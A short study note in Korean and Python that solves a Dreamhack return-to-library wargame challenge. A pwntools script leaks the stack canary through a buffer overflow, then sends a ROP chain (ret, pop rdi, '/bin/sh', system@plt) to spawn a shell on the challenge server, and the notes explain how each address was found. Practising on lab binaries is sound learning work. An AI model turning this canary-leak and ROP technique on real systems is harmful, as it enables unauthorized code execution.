#system-hacking 
# Payload
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.gdb_binary = '/usr/local/bin/pwndbg'
context.binary = '/home/user/Desktop/Dreamhack/Exploit_ReturnToLibrary/rtl'

# e = ELF(context.binary)# context.log_level = "debug"
# p = process(context.binary.path)
p = remote("host3.dreamhack.games", port=10579)

def slog(n, m): return success(": ".join([n, hex(m)]))

payload = b'A'*0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(0x7))
slog('Canary: ', canary)

plt_system = p64(0x4005d0)
binsh = p64(0x400874)
pop_rdi = p64(0x400853) # ROPgadget --binary=./rtl --re "pop rdi"
ret = p64(0x400596) # ROPgadget --binary=./rtl | grep ": ret", 실행마다 바뀔 수 있으니 명령어 실행 후 나온 값으로 대치해 준다.

payload = b'A'*0x38 + p64(canary) + b'B'*0x8
payload += ret
payload += pop_rdi
payload += binsh
payload += plt_system

pause()

p.sendafter(b'Buf: ', payload)
p.interactive()
```
# 풀이 과정
- 첫 번째 입력에서 먼저 버퍼 오버플로우를 일으켜서 카나리 값을 유출한다.
- 두 번째 입력에서 리턴 주소 값을 덮어써야 하는데, 필요한 값은 다음과 같다.
	- plt 테이블에서 system 함수의 위치
		- pwndbg에서 plt 명령어를 실행, system@plt 함수의 위치를 가져온다.
	- `/bin/sh` 문자열의 위치
		- pwndbg에서 `search /bin/sh` 명령을 실행, 나온 결과 중 실행 가능 영역에 있는 주소를 가져온다.
	- `pop_rdi` 가젯의 위치
		- `ROPgadget --binary ./rtl --re "pop rdi"` 명령어로 바이너리에 있는 것 중 해당 정규식 조건을 만족하는 가젯의 위치를 가져온다.
	- `ret` 가젯의 위치
		- `ROPgadget --binary ./rtl | grep ": ret"` 명령어로 단일 ret 명령만 있는 가젯의 주소를 가져온다.
- 페이로드를 조립한다.
	- A 0x38개, 카나리 값, sfp 덮을 B 8개
	- return(system) 모사
		- ret 가젯으로 점프하는 주소 추가 (리턴 후, 다시 리턴하면서 pop_rdi로 /bin/sh로 점프할 수 있게.)
		- pop_rdi 가젯 위치 추가
		- `/bin/sh` 주소값 추가 (rdi에 들어갈 문자)
		- plt상 system 함수 주소값 추가
	- 넣어 둔 ret 가젯 위치로 리턴 후, 다시 리턴할 때 pop rdi로 스택에 /bin/sh 추가, 리턴 주소는 plt@system, 매개변수는 /bin/sh이므로 쉘을 획득할 수 있다.